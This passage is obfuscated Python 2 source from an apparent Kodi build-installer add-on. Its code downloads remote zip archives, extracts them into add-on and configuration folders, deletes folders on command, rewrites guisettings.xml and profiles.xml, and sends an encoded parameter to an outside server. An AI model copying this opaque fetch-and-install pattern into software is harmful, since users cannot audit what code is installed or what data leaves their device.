   if 19 - 19: Oo0Ooo
   if 15 - 15: Oo0Ooo . o0oOOoo / o0oOOo0O0Ooo
   O0oo = 'http://tlbb.me/catsearch.php?search=' + function + '&x=' + iII11 ( 'e' , OOoOOO )
   if I11 == 'true' :
    print "### URL: http://tlbb.me/catsearch.php?search=" + function + '&x=' + iII11 ( 'e' , OOoOOO )
    if 23 - 23: OoO0O00 % OoooooooOO * o0oOOoo
   i11i1ii1I = iII11 ( 'd' , i1111I1iii1 ( O0oo ) ) . replace ( '|_|' , ' ' ) . replace ( '|!|' , '\n' )
   if I11 == 'true' :
    print "### Return orig: " + i11i1ii1I
    print "### FUNCTION: " + function
   i1iIiIi1I = re . compile ( 'name="(.+?)"t="(.+?)"d="(.+?)"l="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
   for oOo00O0oo00o0 , O0o0 , i1iIi , o0OoIiiiiiiI111i in i1iIiIi1I :
    print oOo00O0oo00o0
    IiII111i1i11 ( '' , oOo00O0oo00o0 , o0OoIiiiiiiI111i , 'install_venz' , O0o0 , '' , '' , i1iIi )
  except :
   iiIIiI1I ( 'No Response from server' , 'Sorry Please try later' , '1000' , os . path . join ( ooooooO0oo , 'plugin.program.tbs' , 'resources' , 'cross.png' ) )
   if 6 - 6: I1IiiI . II111iiii + i1Ii11i1i / OoO0O00 % I1IiiI . OoooooooOO
   if 64 - 64: iIii1I11I1II1 + II111iiii . OOOOOOoo0O % Oo0Ooo * o0oOOoo
   if 7 - 7: i1IIi + i1IIi / oOO00
   if 32 - 32: OO000 * I1ii11iIi11i - OoooooooOO / I1IiiI . o0oOOoo - i1IIi
   if 60 - 60: OoOoOO00 % OoOoOO00
   if 2 - 2: OO000 . O0 - ooOo + oOO00
   if 96 - 96: OO000 + OO000
def iiiIi1Iiii1I ( command , repo_link , repo_id ) :
 O0Oo00o0o = 'DLE'
 oooooO0oO0o = os . path . join ( IiIIIi1iIi , 'updates.zip' )
 if not os . path . exists ( IiIIIi1iIi ) :
  os . makedirs ( IiIIIi1iIi )
  if 63 - 63: OO000 - II111iiii . OooO00OOoO00 / OoOoOO00
 if command == 'delete' :
  shutil . rmtree ( xbmc . translatePath ( repo_link ) )
  i1II1 ( )
  if 17 - 17: o0oOOoo
 if command == 'addons' or command == 'ADDON_DATA' or command == 'media' or command == 'config' or command == 'playlists' or command == 'custom' :
  if 13 - 13: Oo0Ooo - OooO00OOoO00 / ooOo - Oo0Ooo - OOOOOOoo0O / i11iIiiIii
  if not os . path . exists ( os . path . join ( ooooooO0oo , repo_id ) ) or repo_id == '' :
   try :
    downloader . download ( repo_link , oooooO0oO0o )
   except :
    pass
  if ( command == "addons" and not os . path . exists ( os . path . join ( ooooooO0oo , repo_id ) ) ) or ( command == 'addons' and repo_id == '' ) :
   try :
    extract . all ( oooooO0oO0o , ooooooO0oo )
    i1II1 ( )
   except :
    pass
    if 29 - 29: oOO00 - OooO00OOoO00 . O0 . O0
  if command == 'ADDON_DATA' :
   try :
    extract . all ( oooooO0oO0o , O0O )
   except :
    print "### FAILED TO EXTRACT TO " + O0O
    if 16 - 16: i1IIi * o0oOOoo % OoO0O00 + OO000
  if command == 'media' :
   try :
    extract . all ( oooooO0oO0o , I11i1 )
   except :
    pass
    if 50 - 50: ooOo - OoooooooOO + OOOOOOoo0O % OoO0O00
  if command == 'config' :
   try :
    extract . all ( oooooO0oO0o , oOOo0 )
   except :
    pass
    if 12 - 12: i1IIi / I1ii11iIi11i - OOOOOOoo0O . i11iIiiIii / i1IIi / OoooooooOO
  if command == 'playlists' :
   try :
    extract . all ( oooooO0oO0o , O00o0OO )
   except :
    pass
    if 88 - 88: OO000 / i11iIiiIii % OoOoOO00 % Oo
  if command == 'custom' :
   try :
    extract . all ( oooooO0oO0o , repo_id )
   except :
    print "### Failed to extract update " + repo_link
    if 70 - 70: I1ii11iIi11i . I1ii11iIi11i / OooO00OOoO00 . I1ii11iIi11i
 if os . path . exists ( oooooO0oO0o ) :
  try :
   os . remove ( oooooO0oO0o )
  except :
   pass
   if 37 - 37: i1IIi . i1Ii11i1i - II111iiii % o0oOOo0O0Ooo - i1IIi . ooOo
   if 34 - 34: iIii1I11I1II1 / II111iiii
def IIIii111i ( url , local ) :
 IioOo0O ( )
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( oOo00O0oo00o0 , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 58 - 58: Oo % OOOOOOoo0O * O0 + I1ii11iIi11i - oOO00
 if iIiI1 == 1 :
  IiiII ( url , local )
  if 72 - 72: Oo0Ooo + i1Ii11i1i % I1ii11iIi11i + Oo % i1Ii11i1i
def iiiiI11 ( path ) :
 if 10 - 10: o0oOOoo - Oo0Ooo % II111iiii
 iiIi1I1i1 = open ( O000OO0 , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 if 66 - 66: iIii1I11I1II1 . iIii1I11I1II1
 I1iI1111ii1I1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( IiiI )
 oOIIIi = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( IiiI )
 ii1I = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( IiiI )
 O0oo00o000 = I1iI1111ii1I1 [ 0 ] if ( len ( I1iI1111ii1I1 ) > 0 ) else ''
 II1111iiI1II = oOIIIi [ 0 ] if ( len ( oOIIIi ) > 0 ) else ''
 OoOOOO00 = ii1I [ 0 ] if ( len ( ii1I ) > 0 ) else ''
 if 15 - 15: Oo * o0oOOoo + II111iiii . i1Ii11i1i . ooOo
 if 46 - 46: oOO00 % i1Ii11i1i + iIii1I11I1II1 * I1IiiI
 i1iI1IIi1I = open ( path , mode = 'r' )
 oo00i1i11I1I1 = i1iI1IIi1I . read ( )
 i1iI1IIi1I . close ( )
 if 64 - 64: I1ii11iIi11i * OO000 * Oo0Ooo % oOO00 % o0oOOoo
 OoO0000O = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oo00i1i11I1I1 )
 I1I1iI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oo00i1i11I1I1 )
 IIIOo0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oo00i1i11I1I1 )
 i1iIi1iiii1ii = OoO0000O [ 0 ] if ( len ( OoO0000O ) > 0 ) else ''
 oO0oOo = I1I1iI [ 0 ] if ( len ( I1I1iI ) > 0 ) else ''
 IIiIiii = IIIOo0O [ 0 ] if ( len ( IIIOo0O ) > 0 ) else ''
 iiiI1i11Ii = IiiI . replace ( O0oo00o000 , i1iIi1iiii1ii ) . replace ( OoOOOO00 , IIiIiii ) . replace ( II1111iiI1II , oO0oOo )
 if 71 - 71: o0oOOo0O0Ooo + Oo . Oo0Ooo - OoOoOO00 * i11iIiiIii . OoOoOO00
 print "### Attempting to create new guisettings at: " + path
 oo00IIIIIIIiI = open ( path , mode = 'w+' )
 oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
 oo00IIIIIIIiI . close ( )
 if 91 - 91: O0 - OooO00OOoO00 % i1Ii11i1i
 if 46 - 46: o0oOOoo / I1IiiI . oOO00 % OoO0O00 / i11iIiiIii
def IiiII ( url , local ) :
 o0O00oo0O = False
 I1III1I1IiI = 0
 ooooooo0oOo0 = 1
 if 81 - 81: i11iIiiIii % I1IiiI / OOOOOOoo0O % OoO0O00 / i1Ii11i1i % iIii1I11I1II1
 if os . path . exists ( O00OOOoOoo0O ) :
  os . remove ( O00OOOoOoo0O )
  if 14 - 14: I1ii11iIi11i * Oo0Ooo + i11iIiiIii % Oo - ooOo
 if os . path . exists ( I11iii1Ii ) :
  os . remove ( I11iii1Ii )
  if 11 - 11: I1ii11iIi11i / O0 + II111iiii
 if os . path . exists ( oo0OooOOo0 ) :
  os . remove ( oo0OooOOo0 )
  if 95 - 95: i1Ii11i1i + oOO00 * iIii1I11I1II1
 if not os . path . exists ( O000OOo00oo ) :
  os . makedirs ( O000OOo00oo )
  if 17 - 17: OoO0O00 - Oo0Ooo * O0 / OO000
  if 19 - 19: i1IIi - iIii1I11I1II1 . OooO00OOoO00
 try :
  shutil . copyfile ( O000OO0 , O00OOOoOoo0O )
  if 2 - 2: OO000
 except :
  print "No guisettings found, most likely due to a previously failed attempt at install"
  if 12 - 12: i11iIiiIii - iIii1I11I1II1 * oOO00 * OOOOOOoo0O
 if local != 1 :
  iiIII1i = os . path . join ( oO0Oo , 'guifix.zip' )
  if 13 - 13: O0 * o0oOOoo - i1IIi - OO000
 else :
  iiIII1i = xbmc . translatePath ( url )
  if 84 - 84: II111iiii / OoO0O00 . oOO00
 try :
  downloader . download ( url , iiIII1i )
 except :
  print "Failed to download guisettings"
  if 79 - 79: Oo
 o00oO00O0 = str ( os . path . getsize ( iiIII1i ) )
 Ooo . create ( "Installing Skin Fix" , "Checking " , '' , 'Please Wait' )
 Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 extract . all ( iiIII1i , O000OOo00oo , Ooo )
 if 16 - 16: OO000 / i11iIiiIii + O0 . oOO00
 if os . path . exists ( os . path . join ( O000OOo00oo , 'script.skinshortcuts' ) ) :
  try :
   shutil . rmtree ( os . path . join ( O0O , 'script.skinshortcuts' ) )
  except :
   pass
  os . rename ( os . path . join ( O000OOo00oo , 'script.skinshortcuts' ) , os . path . join ( O0O , 'script.skinshortcuts' ) )
  if 15 - 15: Oo0Ooo + OOOOOOoo0O + I1IiiI * o0oOOo0O0Ooo
 if local != 'library' or local != 'updatelibrary' or local != 'fresh' :
  if 33 - 33: o0oOOo0O0Ooo * Oo0Ooo
  try :
   IiiIiIIi1 = open ( os . path . join ( O000OOo00oo , 'profiles.xml' ) , mode = 'r' )
   O0OOOOoOOO = IiiIiIIi1 . read ( )
   IiiIiIIi1 . close ( )
   if 64 - 64: II111iiii / II111iiii
   if os . path . exists ( os . path . join ( O000OOo00oo , 'profiles.xml' ) ) :
    if 52 - 52: i1Ii11i1i * I1ii11iIi11i
    if local == None :
     iIiI1 = xbmcgui . Dialog ( ) . yesno ( "PROFILES DETECTED" , 'This build has profiles included (standard Kodi profiles, not CP Profiles), would you like to overwrite your existing profiles or keep the ones you have?' , '' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
     if 35 - 35: o0oOOo0O0Ooo % OoO0O00
    if local != None :
     iIiI1 = 1
     if 27 - 27: OO000 - iIii1I11I1II1 * OO000
    if iIiI1 == 1 :
     oo00IIIIIIIiI = open ( oo0OooOOo0 , mode = 'w' )
     time . sleep ( 1 )
     oo00IIIIIIIiI . write ( O0OOOOoOOO )
     time . sleep ( 1 )
     oo00IIIIIIIiI . close ( )
     ooooooo0oOo0 = 0
     if 30 - 30: o0oOOo0O0Ooo + OO000 / OoooooooOO - oOO00 % ooOo
  except :
   print "no profiles.xml file"
   if 21 - 21: OoooooooOO % OoOoOO00 - OoOoOO00 / I1ii11iIi11i / o0oOOo0O0Ooo
   if 15 - 15: o0oOOoo / o0oOOoo % OoooooooOO . i1Ii11i1i
 os . rename ( os . path . join ( O000OOo00oo , 'guisettings.xml' ) , I11iii1Ii )
 if 93 - 93: I1ii11iIi11i * I1ii11iIi11i / OoooooooOO
 if local != 'fresh' :
  iIIIiiI1i1iIi = OO0o . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones in this build?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
  if 79 - 79: i1IIi % I1ii11iIi11i * I1IiiI . II111iiii - i1IIi + ooOo
 if local == 'fresh' :
  iIIIiiI1i1iIi = 1
  if 58 - 58: OOOOOOoo0O - OoooooooOO
 if iIIIiiI1i1iIi == 1 :
  if 56 - 56: OOOOOOoo0O / OOOOOOoo0O
  if os . path . exists ( O000OO0 ) :
   if 21 - 21: O0 * o0oOOoo % OoOoOO00 / O0
   try :
    print "### Attempting to remove guisettings"
    os . remove ( O000OO0 )
    o0O00oo0O = True
    if 85 - 85: OoooooooOO + OoooooooOO
   except :
    print "### Problem removing guisettings"
    o0O00oo0O = False
    if 23 - 23: i1IIi
   try :
    print "### Attempting to replace guisettings with new"
    os . rename ( I11iii1Ii , O000OO0 )
    o0O00oo0O = True
    if 31 - 31: Oo0Ooo - iIii1I11I1II1 / OooO00OOoO00 . OoO0O00
   except :
    print "### Failed to replace guisettings with new"
    o0O00oo0O = False
    if 74 - 74: Oo0Ooo - II111iiii - oOO00
    if 50 - 50: I1IiiI - ooOo + ooOo * OooO00OOoO00 + ooOo
 if iIIIiiI1i1iIi == 0 :
  iiIi1I1i1 = open ( O00OOOoOoo0O , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  if 70 - 70: i1IIi % OoO0O00 / i1IIi
  I1iI1111ii1I1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( IiiI )
  oOIIIi = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( IiiI )
  ii1I = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( IiiI )
  O0oo00o000 = I1iI1111ii1I1 [ 0 ] if ( len ( I1iI1111ii1I1 ) > 0 ) else ''
  II1111iiI1II = oOIIIi [ 0 ] if ( len ( oOIIIi ) > 0 ) else ''
  OoOOOO00 = ii1I [ 0 ] if ( len ( ii1I ) > 0 ) else ''
  if 30 - 30: OoOoOO00 - i11iIiiIii
  if 94 - 94: OoOoOO00 % OOOOOOoo0O
  i1iI1IIi1I = open ( I11iii1Ii , mode = 'r' )
  oo00i1i11I1I1 = i1iI1IIi1I . read ( )
  i1iI1IIi1I . close ( )
  if 39 - 39: OoOoOO00 + i1Ii11i1i % O0
  OoO0000O = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oo00i1i11I1I1 )
  I1I1iI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oo00i1i11I1I1 )
  IIIOo0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oo00i1i11I1I1 )
  i1iIi1iiii1ii = OoO0000O [ 0 ] if ( len ( OoO0000O ) > 0 ) else ''
  oO0oOo = I1I1iI [ 0 ] if ( len ( I1I1iI ) > 0 ) else ''
  IIiIiii = IIIOo0O [ 0 ] if ( len ( IIIOo0O ) > 0 ) else ''
  iiiI1i11Ii = IiiI . replace ( O0oo00o000 , i1iIi1iiii1ii ) . replace ( OoOOOO00 , IIiIiii ) . replace ( II1111iiI1II , oO0oOo )
  if 26 - 26: o0oOOoo + OoOoOO00
  oo00IIIIIIIiI = open ( O00OOOoOoo0O , mode = 'w+' )
  oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
  oo00IIIIIIIiI . close ( )
  if 17 - 17: I1ii11iIi11i - OOOOOOoo0O % Oo0Ooo * O0 % O0 * Oo
  if 6 - 6: i1Ii11i1i
  if os . path . exists ( O000OO0 ) :
   if 46 - 46: II111iiii * i1Ii11i1i
   try :
    os . remove ( O000OO0 )
    o0O00oo0O = True
    if 23 - 23: i1IIi - O0
   except :
    o0O00oo0O = False
    if 6 - 6: o0oOOoo % OoooooooOO * i1Ii11i1i - oOO00
  try :
   os . rename ( O00OOOoOoo0O , O000OO0 )
   os . remove ( I11iii1Ii )
   o0O00oo0O = True
   if 24 - 24: OooO00OOoO00 / iIii1I11I1II1 . OoooooooOO % OoOoOO00 . OO000
  except :
   o0O00oo0O = False
   if 73 - 73: i1Ii11i1i
   if 25 - 25: oOO00
 if o0O00oo0O == True or local == None :
  if 77 - 77: o0oOOo0O0Ooo . iIii1I11I1II1 . OoooooooOO . iIii1I11I1II1
  try :
   iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'r' )
   IiiI = iiIi1I1i1 . read ( )
   iiIi1I1i1 . close ( )
   if 87 - 87: II111iiii - OoooooooOO / i1IIi . OO000 - Oo0Ooo . i11iIiiIii
   IIIII11II1 = re . compile ( 'id="(.+?)"' ) . findall ( IiiI )
   OOOO0oOO = re . compile ( 'name="(.+?)"' ) . findall ( IiiI )
   IIIiii = re . compile ( 'version="(.+?)"' ) . findall ( IiiI )
   I11OoooO = IIIII11II1 [ 0 ] if ( len ( IIIII11II1 ) > 0 ) else ''
   i1IIi11 = OOOO0oOO [ 0 ] if ( len ( OOOO0oOO ) > 0 ) else ''
   o0oO0o0oo0O0 = IIIiii [ 0 ] if ( len ( IIIiii ) > 0 ) else ''
   if 93 - 93: OoOoOO00 . Oo0Ooo
   oo00IIIIIIIiI = open ( O0Oo000ooO00 , mode = 'w+' )
   oo00IIIIIIIiI . write ( 'id="' + str ( I11OoooO ) + '"\nname="' + i1IIi11 + '"\nversion="' + o0oO0o0oo0O0 + '"\ngui="' + o00oO00O0 + '"' )
   oo00IIIIIIIiI . close ( )
   if 66 - 66: Oo0Ooo - OoOoOO00 - i1Ii11i1i
   iiIi1I1i1 = open ( o00OO00OoO , mode = 'r' )
   IiiI = iiIi1I1i1 . read ( )
   iiIi1I1i1 . close ( )
   if 87 - 87: OoooooooOO + OoooooooOO * o0oOOoo
   iIiiI111I11 = re . compile ( 'version="(.+?)"' ) . findall ( IiiI )
   iiIiII1 = iIiiI111I11 [ 0 ] if ( len ( iIiiI111I11 ) > 0 ) else ''
   iiiI1i11Ii = IiiI . replace ( iiIiII1 , o0oO0o0oo0O0 )
   if 15 - 15: i11iIiiIii / o0oOOo0O0Ooo / OoO0O00 . OoOoOO00 % ooOo
   oo00IIIIIIIiI = open ( o00OO00OoO , mode = 'w' )
   oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
   oo00IIIIIIIiI . close ( )
   os . remove ( OOOO0OOoO0O0 )
   if 29 - 29: o0oOOo0O0Ooo
  except :
   oo00IIIIIIIiI = open ( O0Oo000ooO00 , mode = 'w+' )
   oo00IIIIIIIiI . write ( 'id="None"\nname="Unknown"\nversion="Unknown"\ngui="' + o00oO00O0 + '"' )
   oo00IIIIIIIiI . close ( )
   if 13 - 13: OO000 + OO000 . OooO00OOoO00
   if 57 - 57: o0oOOoo
 if os . path . exists ( os . path . join ( O000OOo00oo , 'profiles.xml' ) ) :
  os . remove ( os . path . join ( O000OOo00oo , 'profiles.xml' ) )
  time . sleep ( 1 )
  if 94 - 94: OoO0O00 - II111iiii % iIii1I11I1II1
 if os . path . exists ( O000OOo00oo ) :
  os . removedirs ( O000OOo00oo )
  if 92 - 92: Oo0Ooo
 i1iII = xbmc . translatePath ( os . path . join ( O0O , I1IiI , 'notification.txt' ) )
 if 83 - 83: o0oOOo0O0Ooo
 if os . path . exists ( i1iII ) :
  os . remove ( i1iII )
  if 26 - 26: O0 . II111iiii * O0 + o0oOOoo + OoOoOO00 * O0
 if o0O00oo0O == True :
  i111iIi1i1 ( )
  try :
   OooOo ( )
  except :
   pass
  OOo00O0O ( )
  if 46 - 46: o0oOOoo - o0oOOoo * I1ii11iIi11i / OOOOOOoo0O * Oo / o0oOOo0O0Ooo
  if 67 - 67: Oo - OO000 % OOOOOOoo0O / II111iiii + I1IiiI * o0oOOoo
def o0o0O0o0O ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/HardwarePortal/hardwaredetails.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 iI1IiiiI = re . compile ( 'manufacturer="(.+?)"' ) . findall ( i11i1ii1I )
 oOOO0OO = re . compile ( 'video_guide1="(.+?)"' ) . findall ( i11i1ii1I )
 I11ii1iI11 = re . compile ( 'video_guide2="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii111i1ii = re . compile ( 'video_guide3="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0O = re . compile ( 'video_guide4="(.+?)"' ) . findall ( i11i1ii1I )
 IiIiiI1ii111 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii1 = re . compile ( 'video_label1="(.+?)"' ) . findall ( i11i1ii1I )
 Ii111I11 = re . compile ( 'video_label2="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0oo = re . compile ( 'video_label3="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0 = re . compile ( 'video_label4="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o0 = re . compile ( 'video_label5="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0o = re . compile ( 'shops="(.+?)"' ) . findall ( i11i1ii1I )
 o0I1IIIi11ii11 = re . compile ( 'description="(.+?)"' ) . findall ( i11i1ii1I )
 iii1I1II1iIii = re . compile ( 'screenshot1="(.+?)"' ) . findall ( i11i1ii1I )
 iioOo00O0o = re . compile ( 'screenshot2="(.+?)"' ) . findall ( i11i1ii1I )
 iI11IIi1iiI1I = re . compile ( 'screenshot3="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o = re . compile ( 'screenshot4="(.+?)"' ) . findall ( i11i1ii1I )
 O0ooOoO0 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( i11i1ii1I )
 Ii1I11IIi1 = re . compile ( 'screenshot6="(.+?)"' ) . findall ( i11i1ii1I )
 I1ii = re . compile ( 'screenshot7="(.+?)"' ) . findall ( i11i1ii1I )
 iiIiii11I1 = re . compile ( 'screenshot8="(.+?)"' ) . findall ( i11i1ii1I )
 i1II1iIii = re . compile ( 'screenshot9="(.+?)"' ) . findall ( i11i1ii1I )
 i1iII1iii = re . compile ( 'screenshot10="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0oOO0o0o = re . compile ( 'screenshot11="(.+?)"' ) . findall ( i11i1ii1I )
 O0O0O00OoO0O = re . compile ( 'screenshot12="(.+?)"' ) . findall ( i11i1ii1I )
 i1II11III = re . compile ( 'screenshot13="(.+?)"' ) . findall ( i11i1ii1I )
 O0OO0oo = re . compile ( 'screenshot14="(.+?)"' ) . findall ( i11i1ii1I )
 II111IiiIIi = re . compile ( 'added="(.+?)"' ) . findall ( i11i1ii1I )
 o0OoOO = re . compile ( 'platform="(.+?)"' ) . findall ( i11i1ii1I )
 o0oo = re . compile ( 'chipset="(.+?)"' ) . findall ( i11i1ii1I )
 oOOO00o0OOO00 = re . compile ( 'official_guide="(.+?)"' ) . findall ( i11i1ii1I )
 oo0oOooo0 = re . compile ( 'official_preview="(.+?)"' ) . findall ( i11i1ii1I )
 iiIiII1ii111iI = re . compile ( 'thumbnail="(.+?)"' ) . findall ( i11i1ii1I )
 oo0oO0oo = re . compile ( 'stock_rom="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0ooo0o = re . compile ( 'CPU="(.+?)"' ) . findall ( i11i1ii1I )
 O0Oo = re . compile ( 'GPU="(.+?)"' ) . findall ( i11i1ii1I )
 O0oOo00Oo0oo0 = re . compile ( 'RAM="(.+?)"' ) . findall ( i11i1ii1I )
 i111 = re . compile ( 'flash="(.+?)"' ) . findall ( i11i1ii1I )
 O0oOO0o00OO = re . compile ( 'wifi="(.+?)"' ) . findall ( i11i1ii1I )
 II1 = re . compile ( 'bluetooth="(.+?)"' ) . findall ( i11i1ii1I )
 i11i1iI1I = re . compile ( 'LAN="(.+?)"' ) . findall ( i11i1ii1I )
 oooOoO00O = re . compile ( 'xbmc_version="(.+?)"' ) . findall ( i11i1ii1I )
 I1i1IIiiI11II = re . compile ( 'pros="(.+?)"' ) . findall ( i11i1ii1I )
 Ii1i1 = re . compile ( 'cons="(.+?)"' ) . findall ( i11i1ii1I )
 iiiIiIIiIiiii = re . compile ( 'library_scan="(.+?)"' ) . findall ( i11i1ii1I )
 o00O0OooO0 = re . compile ( '4k="(.+?)"' ) . findall ( i11i1ii1I )
 iii1II11II1 = re . compile ( '1080="(.+?)"' ) . findall ( i11i1ii1I )
 I11i1Iii1I = re . compile ( '720="(.+?)"' ) . findall ( i11i1ii1I )
 iIIiII1 = re . compile ( '3D="(.+?)"' ) . findall ( i11i1ii1I )
 iI1Iii1i1 = re . compile ( 'DTS="(.+?)"' ) . findall ( i11i1ii1I )
 OoOo00oOoo0oO = re . compile ( 'BootTime="(.+?)"' ) . findall ( i11i1ii1I )
 i1ii1iIII = re . compile ( 'CopyFiles="(.+?)"' ) . findall ( i11i1ii1I )
 ooooooo0000oo0 = re . compile ( 'CopyVideo="(.+?)"' ) . findall ( i11i1ii1I )
 O0oooo000o = re . compile ( 'EthernetTest="(.+?)"' ) . findall ( i11i1ii1I )
 IIiIiI11II = re . compile ( 'Slideshow="(.+?)"' ) . findall ( i11i1ii1I )
 oOo00 = re . compile ( 'total_review="(.+?)"' ) . findall ( i11i1ii1I )
 Oooo = re . compile ( 'whufclee_review="(.+?)"' ) . findall ( i11i1ii1I )
 I1iIiii = re . compile ( 'CB_Premium="(.+?)"' ) . findall ( i11i1ii1I )
 if 87 - 87: II111iiii * OoO0O00 + OO000 . Oo0Ooo - I1ii11iIi11i * ooOo
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 iii1Ii = iI1IiiiI [ 0 ] if ( len ( iI1IiiiI ) > 0 ) else ''
 iI1IIIii = oOOO0OO [ 0 ] if ( len ( oOOO0OO ) > 0 ) else 'None'
 I1i11ii11 = I11ii1iI11 [ 0 ] if ( len ( I11ii1iI11 ) > 0 ) else 'None'
 OO00O0oOO = i11ii111i1ii [ 0 ] if ( len ( i11ii111i1ii ) > 0 ) else 'None'
 Ii1iI111 = Oo0O0O [ 0 ] if ( len ( Oo0O0O ) > 0 ) else 'None'
 O0oooo00o0Oo = IiIiiI1ii111 [ 0 ] if ( len ( IiIiiI1ii111 ) > 0 ) else 'None'
 IiIIi1 = i11ii1 [ 0 ] if ( len ( i11ii1 ) > 0 ) else 'None'
 iII11I1Ii1 = Ii111I11 [ 0 ] if ( len ( Ii111I11 ) > 0 ) else 'None'
 o0o0oOo0oO = Oo0O0oo [ 0 ] if ( len ( Oo0O0oo ) > 0 ) else 'None'
 IIi1IIIIi = o0O0 [ 0 ] if ( len ( o0O0 ) > 0 ) else 'None'
 OOOoO = oO0o0 [ 0 ] if ( len ( oO0o0 ) > 0 ) else 'None'
 ii1ii111I11I1 = o0O0o [ 0 ] if ( len ( o0O0o ) > 0 ) else ''
 IiIi11Iii = o0I1IIIi11ii11 [ 0 ] if ( len ( o0I1IIIi11ii11 ) > 0 ) else ''
 I1IIi = iii1I1II1iIii [ 0 ] if ( len ( iii1I1II1iIii ) > 0 ) else ''
 i1i1IOOOOO0o0O0OOO = iioOo00O0o [ 0 ] if ( len ( iioOo00O0o ) > 0 ) else ''
 O0oo0o00O = iI11IIi1iiI1I [ 0 ] if ( len ( iI11IIi1iiI1I ) > 0 ) else ''
 Iii1 = oO0o [ 0 ] if ( len ( oO0o ) > 0 ) else ''
 I11i1IiiI = O0ooOoO0 [ 0 ] if ( len ( O0ooOoO0 ) > 0 ) else ''
 OOooOO000oOoOo000 = Ii1I11IIi1 [ 0 ] if ( len ( Ii1I11IIi1 ) > 0 ) else ''
 o0O0o0ooo0 = I1ii [ 0 ] if ( len ( I1ii ) > 0 ) else ''
 iIo0O000O00o = iiIiii11I1 [ 0 ] if ( len ( iiIiii11I1 ) > 0 ) else ''
 iiooo = i1II1iIii [ 0 ] if ( len ( i1II1iIii ) > 0 ) else ''
 ii111I1I1I = i1iII1iii [ 0 ] if ( len ( i1iII1iii ) > 0 ) else ''
 iIIiIi1IiI1 = o0O0oOO0o0o [ 0 ] if ( len ( o0O0oOO0o0o ) > 0 ) else ''
 Oo0O = O0O0O00OoO0O [ 0 ] if ( len ( O0O0O00OoO0O ) > 0 ) else ''
 Iii1I1III11 = i1II11III [ 0 ] if ( len ( i1II11III ) > 0 ) else ''
 i1ii1IiIiIii = O0OO0oo [ 0 ] if ( len ( O0OO0oo ) > 0 ) else ''
 OOo0ooOOOo0O0 = II111IiiIIi [ 0 ] if ( len ( II111IiiIIi ) > 0 ) else ''
 iiiI1 = o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else ''
 oo = o0oo [ 0 ] if ( len ( o0oo ) > 0 ) else ''
 I1i1Iii1i1II1 = oOOO00o0OOO00 [ 0 ] if ( len ( oOOO00o0OOO00 ) > 0 ) else 'None'
 O0o00OoooO = oo0oOooo0 [ 0 ] if ( len ( oo0oOooo0 ) > 0 ) else 'None'
 O0o0 = iiIiII1ii111iI [ 0 ] if ( len ( iiIiII1ii111iI ) > 0 ) else ''
 IiI1i1iI = oo0oO0oo [ 0 ] if ( len ( oo0oO0oo ) > 0 ) else ''
 iiiI1ii = o0O0ooo0o [ 0 ] if ( len ( o0O0ooo0o ) > 0 ) else ''
 iIIiiIIIII = O0Oo [ 0 ] if ( len ( O0Oo ) > 0 ) else ''
 iiiII = O0oOo00Oo0oo0 [ 0 ] if ( len ( O0oOo00Oo0oo0 ) > 0 ) else ''
 Oo0OooII1iII11 = i111 [ 0 ] if ( len ( i111 ) > 0 ) else ''
 iiiI1IiIi1i1I = O0oOO0o00OO [ 0 ] if ( len ( O0oOO0o00OO ) > 0 ) else ''
 O0Oooo = II1 [ 0 ] if ( len ( II1 ) > 0 ) else ''
 IiiI11Iii = i11i1iI1I [ 0 ] if ( len ( i11i1iI1I ) > 0 ) else ''
 oOooOOOoOo = oooOoO00O [ 0 ] if ( len ( oooOoO00O ) > 0 ) else ''
 I1Iii1 = I1i1IIiiI11II [ 0 ] if ( len ( I1i1IIiiI11II ) > 0 ) else ''
